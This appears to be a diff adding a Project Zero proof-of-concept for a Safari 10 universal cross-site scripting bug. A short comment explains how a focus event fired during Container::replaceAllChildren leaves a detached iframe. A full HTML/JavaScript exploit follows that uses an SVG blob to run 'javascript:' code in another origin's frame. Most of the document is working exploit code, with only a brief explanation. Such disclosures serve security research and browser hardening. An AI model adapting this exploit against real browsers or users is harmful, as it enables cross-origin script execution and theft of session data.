@@ -1,0 +1,61 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1119
+
+This is somewhat similar to https://crbug.com/663476.
+
+Here's a snippet of Container::replaceAllChildren.
+
+while (RefPtr<Node> child = m_firstChild) {
+    removeBetween(nullptr, child->nextSibling(), *child);
+    notifyChildNodeRemoved(*this, *child);
+}
+
+If the location hash value is set, the page will give focus to the associated element. However, if there is a stylesheet that has not been loaded yet, the focusing will be delayed until the stylesheet gets loaded. The problem is that when the link element linked to the last pending stylesheet is removed from the parent, the notifyChildNodeRemoved function may end up to fire a focus event which runs arbitrary JavaScript code, which can make an iframe(|g| in the PoC) that has an attached frame but has no parent.
+
+Tested on Safari 10.0.3(12602.4.8).
+-->
+
+<html>
+<head>
+</head>
+<body>
+<script>
+
+let f = document.body.appendChild(document.createElement('iframe'));
+let inp = f.contentDocument.head.appendChild(document.createElement('input'));
+let link = inp.appendChild(document.createElement('link'));
+link.rel = 'stylesheet';
+link.href = 'data:,aaaaazxczxczzxzcz';
+
+let btn = f.contentDocument.body.appendChild(document.createElement('button'));
+btn.id = 'btn';
+btn.onfocus = () => {
+    btn.onfocus = null;
+
+    window.g = inp.appendChild(document.createElement('iframe'));
+    window.g.onload = () => {
+        window.g.onload = null;
+
+        window.g.src = 'javascript:alert(location)';
+        let xml = `
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>
+document.documentElement.appendChild(parent.g);
+
+</sc` + `ript>
+<element a="1" a="2" />
+</svg>`;
+
+        let h = document.body.appendChild(document.createElement('iframe'));
+        h.src = URL.createObjectURL(new Blob([xml], {type: 'text/xml'}));
+    };
+
+    window.g.src = 'https://abc.xyz/';
+};
+
+f.contentWindow.location.hash = 'btn';
+inp.textContent = '';
+
+</script>
+</body>
+</html>
